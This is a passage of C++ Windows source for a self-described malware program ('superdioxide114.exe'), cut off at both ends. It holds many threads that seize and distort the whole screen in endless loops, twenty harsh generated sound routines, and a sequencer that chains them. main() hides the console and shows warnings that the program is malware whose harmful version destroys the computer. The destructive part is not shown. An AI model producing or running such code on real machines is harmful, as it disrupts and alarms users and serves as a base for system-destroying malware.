            int x = 100 * cos(i * 3.14159265358979 / 180.f), y = 100 * sin(i * 3.14159265358979 / 180.f);
            rgbScreen[i].b += x ^ y;
            rgbScreen[i].r = rand() % 255;
            rgbScreen[i].g = rand() % 255;
        }
        BitBlt(hdcScreen, 0, 0, screenWidth, screenHigh, hdcMem, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader11_NoName6(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(0), screenHigh = GetSystemMetrics(1);
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = screenHigh;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHigh, hdcScreen, 0, 0, SRCCOPY);
        for (int i = 0; i < screenWidth * screenHigh; i++) {
            int x = i % screenWidth, y = i / screenWidth;
            int gray = (rgbScreen[i].r + rgbScreen[i].g + rgbScreen[i].b) / 3;
            rgbScreen[i].r = gray;
            rgbScreen[i].g = gray;
            rgbScreen[i].b = gray;
            rgbScreen[i].rgb += x * y;
        }
        BitBlt(hdcScreen, 0, 0, screenWidth, screenHigh, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader12_RandomColor(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(0), screenHigh = GetSystemMetrics(1);
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = screenHigh;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHigh, hdcScreen, 0, 0, SRCCOPY);
        int rgb = RndRGB;
        for (int i = 0; i < screenWidth * screenHigh; i++) {
            int gray = (rgbScreen[i].r + rgbScreen[i].g + rgbScreen[i].b) / 3;
            rgbScreen[i].rgb = RGB(gray, gray, gray);
            rgbScreen[i].rgb ^= rgb;
        }
        BitBlt(hdcScreen, 0, 0, screenWidth, screenHigh, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader13_Wall(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(0), screenHigh = GetSystemMetrics(1);
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = screenHigh;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHigh, hdcScreen, 0, 0, SRCCOPY);
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHigh; y++) {
                rgbScreen[x + screenWidth * y].rgb *= x ^ y;
            }
        }
        BitBlt(hdcScreen, 0, 0, screenWidth, screenHigh, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader14_ChangeRGBToGBR(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        RGBQUAD* rgbquad = NULL;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x + w * y;
                int rgbtmp = RGB(rgbquad[index].rgbRed, rgbquad[index].rgbGreen, rgbquad[index].rgbBlue);
                rgbquad[index].rgbRed = GetGValue(rgbtmp);
                rgbquad[index].rgbGreen = GetBValue(rgbtmp);
                rgbquad[index].rgbBlue = GetRValue(rgbtmp);
            }
        }
        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader15_Last(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        PRGBQUAD rgbquad = NULL;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int i = x + w * y;
                rgbquad[i].rgb ^= RndRGB;
            }
        }
        StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t + t) >> t) ^ (t * t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t | t % 252);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 11 & t >> 12) * (t >> 8 & t >> 16) % 34 * t + 4E5 / (t & 4095));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 40960, 40960, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    static char buffer[40960 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (t & (1 << 4 + (t >> 17 & 3)) + 3) >> 8) + t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 | t >> 0xdeaddead) | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((rand() | t >> 9 | t >> 6) ^ (rand() % 28));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ t / 2 ^ (int)(t * t / 1E7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(rand() | t >> t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(430 * (t * 5 >> 11 & t * 5 >> 1));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 2 & t >> 9 | t & t >> 10 | t % 20));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t * 5 >> 1 | t * 5 >> 11));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2 * (1 - (t + 10 >> (t >> 9 & t >> 14) & t >> 4 & -2)) * ((t >> 10 ^ t + (t >> 6 & 127) >> 10) & 1) * 32 + 128);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 7 | 3 * t | t >> (t >> 16)) + (t >> 8 & 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((42 & t >> 9) << t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 10 | t % 16 * t >> 5) & 8 * t >> 10 & 18) | rand() % 100);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ t % 1001 + t ^ t % 1002) ^ (rand() % 78));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {//from I_Am_a_potato.exe
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 655368 < 59392 ? 7 : t >> 6 : 32) + (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 4 : 3 : 2) ^ ((t >> 6 | t | t >> (t >> 16)) * 10 + ((t >> 11) & 7)) + t % 125 & t >> 8 | t >> 4 | t * t >> 8 & t >> 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)(t * t / (double)(t >> 12 & t >> 8)) << 7 | rand() % 100);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((((t / 10 | 0) ^ (t / 10 | 0) - 1280) % 11 * t / 2 & 127) + (((t / 640 | 0) ^ (t / 640 | 0) - 2) % 13 * t / 2 & 127));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void clean() {
    InvalidateRect(0, 0, 0);
    Sleep(100);
}
void SPtime() {
    Sleep(30000);
}
void runSP() {
    HANDLE wnd1 = CreateThread(NULL, 0, Window1_Msgbox, NULL, 0, NULL);
    Sleep(100);
    sound1();
    HANDLE th1 = CreateThread(NULL, 0, Shader1_NoName, NULL, 0, NULL);
    SPtime();
    TerminateThread(th1, 0);
    clean();
    sound2();
    HANDLE th2 = CreateThread(NULL, 0, Shader2_NoName2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th2, 0);
    clean();
    sound3();
    HANDLE th3a = CreateThread(NULL, 0, Payload1a_Superdioxide114, NULL, 0, NULL);
    HANDLE th3b = CreateThread(NULL, 0, Payload1b_114Icon, NULL, 0, NULL);
    SPtime();
    TerminateThread(th3a, 0);
    clean();
    sound4();
    HANDLE th4a = CreateThread(NULL, 0, Shader3_NoName3_th4a, NULL, 0, NULL);
    HANDLE th4b = CreateThread(NULL, 0, Payload2_Ci_th4b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th4a, 0);
    clean();
    sound5();
    HANDLE th5a = CreateThread(NULL, 0, Shader4_NoName4_th5a, NULL, 0, NULL);
    HANDLE th5b = CreateThread(NULL, 0, Payload3_114Icon2_th5b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th5a, 0);
    TerminateThread(th5b, 0);
    clean();
    sound6();
    HANDLE th6 = CreateThread(NULL, 0, Shader5_NoName5, NULL, 0, NULL);
    SPtime();
    TerminateThread(th6, 0);
    clean();
    sound7();
    HANDLE th7a = CreateThread(NULL, 0, Payload4a_Rotate, NULL, 0, NULL);
    HANDLE th7b = CreateThread(NULL, 0, Payload4b_Icon, NULL, 0, NULL);
    SPtime();
    TerminateThread(th7a, 0);
    clean();
    sound8();
    HANDLE th8 = CreateThread(NULL, 0, Payload5_Wave, NULL, 0, NULL);
    SPtime();
    TerminateThread(th8, 0);
    clean();
    sound9();
    HANDLE th9 = CreateThread(NULL, 0, Shader6_Move, NULL, 0, NULL);
    SPtime();
    TerminateThread(th9, 0);
    clean();
    sound10();
    HANDLE th10a = CreateThread(NULL, 0, Payload6a_Mix, NULL, 0, NULL);
    HANDLE th10b = CreateThread(NULL, 0, Payload6b_Str, NULL, 0, NULL);
    HANDLE th10c = CreateThread(NULL, 0, Payload6c_Text, NULL, 0, NULL);
    SPtime();
    TerminateThread(th10a, 0);
    TerminateThread(th10b, 0);
    TerminateThread(th4b, 0);
    clean();
    sound11();
    HANDLE th11 = CreateThread(NULL, 0, Payload7_Wave2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th11, 0);
    clean();
    sound12();
    HANDLE th12 = CreateThread(NULL, 0, Shader7_Darker, NULL, 0, NULL);
    SPtime();
    TerminateThread(th12, 0);
    clean();
    sound13();
    HANDLE th13 = CreateThread(NULL, 0, Shader8_NoName6, NULL, 0, NULL);
    SPtime();
    TerminateThread(th13, 0);
    clean();
    sound14();
    HANDLE th14 = CreateThread(NULL, 0, Shader9_Line, NULL, 0, NULL);
    SPtime();
    TerminateThread(th14, 0);
    clean();
    sound15();
    HANDLE th15 = CreateThread(NULL, 0, Shader10_Error, NULL, 0, NULL);
    SPtime();
    TerminateThread(th15, 0);
    clean();
    sound16();
    HANDLE th16 = CreateThread(NULL, 0, Shader11_NoName6, NULL, 0, NULL);
    SPtime();
    TerminateThread(th16, 0);
    clean();
    sound17();
    HANDLE th17 = CreateThread(NULL, 0, Shader12_RandomColor, NULL, 0, NULL);
    SPtime();
    TerminateThread(th17, 0);
    clean();
    sound18();
    HANDLE th18 = CreateThread(NULL, 0, Shader13_Wall, NULL, 0, NULL);
    SPtime();
    TerminateThread(th18, 0);
    clean();
    sound19();
    HANDLE th19 = CreateThread(NULL, 0, Shader14_ChangeRGBToGBR, NULL, 0, NULL);
    SPtime();
    TerminateThread(th19, 0);
    clean();
    sound20();
    HANDLE th20 = CreateThread(NULL, 0, Shader15_Last, NULL, 0, NULL);
    SPtime();
    TerminateThread(th20, 0);
    TerminateThread(wnd1, 0);
    TerminateThread(th10c, 0);
    TerminateThread(th3b, 0);
    TerminateThread(th7b, 0);
    clean();
}
void InitDPI() {
    HMODULE hModUser32 = LoadLibraryW(L"user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
    if (SetProcessDPIAware)
        SetProcessDPIAware();
    FreeLibrary(hModUser32);
}
DWORD xs;
void SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}
int main() {
    InitDPI();
    srand(time(NULL));
    SeedXorshift32((DWORD)time(NULL));
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    LPCWSTR MessageTextFirst = L"警告！！！\n\n你是否要运行我？？我是恶意程序！如果你想安好度日，切勿在你的重要电脑上运行我这个有害程序。我绝非在开玩笑！！这是千真万确的。我必须告诉你一件至关重要的事：切勿在公共或重要电脑上运行我的有害程序！！如果你执意要运行，可在虚拟机（VM）或无关紧要的电脑上操作。若你不想失去浮木、给，就绝不要复制我的代码！！！\n\n作者：github@uiui-sod  bilibili@uiui-优哀优哀";
    LPCWSTR MessageTextSecond = L"最后警告\n\n好吧，你可能仍然不知道发生了什么，那我来告诉你：你刚刚运行了一个恶意软件（就是我），如果你想继续，请点击“Yes”按钮，否则请点击“No”按钮。恶意软件是一款应用程序，它有两个版本，第一个是有害版本，会摧毁这台电脑；第二个是无害版本，不会摧毁系统，但会轻微损坏中央处理器（CPU）。那么，你能做决定了吗？？";
    if (MessageBoxW(0, MessageTextFirst, L"superdioxide114.exe-警告", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
